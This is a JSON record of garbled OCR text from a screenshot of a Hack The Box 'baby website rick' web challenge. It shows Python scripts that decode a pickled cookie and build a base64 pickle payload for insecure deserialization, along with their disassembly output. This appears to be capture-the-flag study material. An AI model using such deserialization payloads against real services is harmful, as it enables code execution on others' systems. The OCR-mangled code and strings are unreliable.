{"path":"zzz_res/attachments/baby_website_rick_5.png","text":"B lali@%cali:~/CTFs/HTBchallenge/web/baby website rick -ox = ~/CTFs/HTB/challenge/web/baby website rick/exploit.py - Sublime Text (UNREGISTERED) - File Actions Edit View Help File Edit Selection Find View Goto Tools Project Preferences Help (kali® kali)-[~/../HTB/challenge/web/baby website rick] & 4P decompile.py % basic-pickle.py x + Cs python3 decompile.py. . . . Decoded pickle: b”(dp@\\ns'serum’\\np1\\nccopy_reg\\n_reconstructor\\np2\\n(c_main_ \\nanti_pickle_serum\\np3\\nc_ builtin 1 import pickle = \\nobject\\np4\\nNtp5\\nRp6\\NS. \" 2 import pickletools — = - 3 import base64 — 2 Decompiled pickle: 2 D T e (e 7 0: ( MARK 8 plan_b = 'KGRWMAPTI3NLcnVtIwpwMQp]Y29weV9yZWckX3J1Y29uc3RydWNBb3IKCDIKKGN FX21hals fXwphbnRpX3BpY21 1:d pICT [T 9 - 2:s STRING ‘serum’ 10 11: ¢ GLOBAL 'copy_reg _reconstructor’ 11 # dump the data 36: ( MARK 12 data - base64.b64decode(plan_b) 37: ¢ GLOBAL '_main__ anti_pickle_serun’ 13 print(f*Decoded pickle: {data}\") 65: GLOBAL *“builtin__ object\" 14 85: N NONE 15 i } } 86t t TUPLE (MARK at 36) 16 print(*\\n\\nDecompiled pickle:\\n\") S B pEeE 17 data = pickletools.optinize(data) 88: s SETITEM 18 pickletools.dis(data) B erorop % print(*\\i\\nDumped pickles\\n) highest protocol among opcodes = © 21 pickle.loads(data) : Dumped pickle: ———————— E(kili@ lali)-[~/../HTB/challenge/web/baby website rick] 4P exploitpy x L $ 1 #!/usr/bin/env python 2 2 import pickle - -_ 3 import pickletools = E(kilx@ lali)-[~/../HTB/challenge/web/baby website rick] 4 pULLTad) LEELTY $ python3 exploit.py 5 import os 0: ( MARK 3 1:d pICT [T 7 class anti_pickle serun: 2: vV UNICODE 'serum’ 8 def _init (self): 9: ¢ GLOBAL \"copy_reg _reconstructor’ 9 [EE TN LLLLY 10 35: ¢ [T ' _main_ anti_pickle_serum’ g o3 ¢ CLOBAL —PHNEDL clE 13 exploit obj = anti pickle serun() 30 HONE 14 raw_pickle = pickle.dunps({\"serun\" : exploit_obj}, protocol=0) 84: t TUPLE (MARK at 34) = 1P CHAIGEALLT & DI ER [ 0pe [ REIEE 16 optimed pickle = pickletools.optinize(raw pickle) GRS s SEImE 17 pickletools.dis(optimed pickle) 87: . sTOP 18 d highest protocol among opcodes = 0 19 payload = base64.bGdencode (raw_pickle) 20 print(f'\\n\\nPayload: {payload}\\n') pat Payload: b'KGRwMApWC2VydWOKCDEKY2NvCHLfcmVnCl9yZWNvbnNOcnVjdGIyCnAyCihjX19tYWLuX18KYWS0aVIwaWNrbGV fc2VydWoKcDMKY19 FYNVpbHRpb19FCm9iamVjdApWNAPOAHALCT JuNgpzLg—\"","libVersion":"0.5.0","langs":"eng"}